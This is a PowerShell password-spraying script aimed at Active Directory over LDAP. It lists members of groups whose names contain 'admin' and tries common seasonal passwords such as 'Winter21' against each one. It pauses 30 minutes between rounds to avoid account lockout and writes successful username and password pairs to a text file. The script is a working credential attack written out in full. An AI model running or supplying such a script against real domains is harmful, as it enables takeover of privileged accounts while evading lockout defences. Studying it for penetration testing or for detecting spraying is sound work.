#AD Password Spraying (LDAP)

#suppress errors 
$ErrorActionPreference = "SilentlyContinue"

#Check password policy
#net accounts 

#Passwords to try 
$passwords = @(
"Winter21"
"Spring21"
"Welcome21"
)


########### Speicfy the domain ###########
$domain = "FakeAdDomain.com"

########### TARGET SELECTION SECTION ##########
#Below is just an example of what we can target...
write-host "Getting user list from AD (LDAP)"
$groups = Get-ADGroup -LDAPFilter "(samAccountName=*admin*)" -Server $domain -Properties members #Get all groups admin in name
$userTargets = $groups.Members | select -Unique

########### TESTING CREDS SECTION ############
foreach($p in $passwords){
    
    #Get time to limit the number of attempts per 30 mins 
    $endTime = (Get-Date).AddMinutes(30)

    Write-Host "Spraying password:" $p "for" $userTargets.Count "users" 
    foreach($u in $userTargets){
        
        #Clear check var
        Clear-Variable check -ErrorAction SilentlyContinue

        $u = Get-ADUser $u -Server $domain 

        #Making credential object
        $username = $domain + "\" + $u.SamAccountName
        $securePwd = ConvertTo-SecureString -AsPlainText $p -Force
        $creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username,$securePwd 

        #Testing credentials
        try{
            $test = Get-ADUser $u.SamAccountName -Server $domain -Credential $creds
            Write-Host "[+] Success!" -ForegroundColor Green
            Write-Host "User:" $u.SamAccountName 
            Write-Host "Pwd: " $p 
            Write-Host "" 
            $username + ":" + "$p" >> "c:\temp\crackered.txt"
        }
        catch{
            Write-Host "[-] Invalid password!" -ForegroundColor Yellow
            Write-Host "User:" $u.SamAccountName 
            Write-Host "Pwd: " $p
            write-host "Error:" $Error[0].FullyQualifiedErrorId
            Write-Host ""
        }
    }
    $now = Get-Date
    while($endTime -gt $now){
        "Waiting until " + $endTime + " to avoid lockout threshold"
        Start-Sleep -Seconds 1
        $now = Get-Date
    }
}

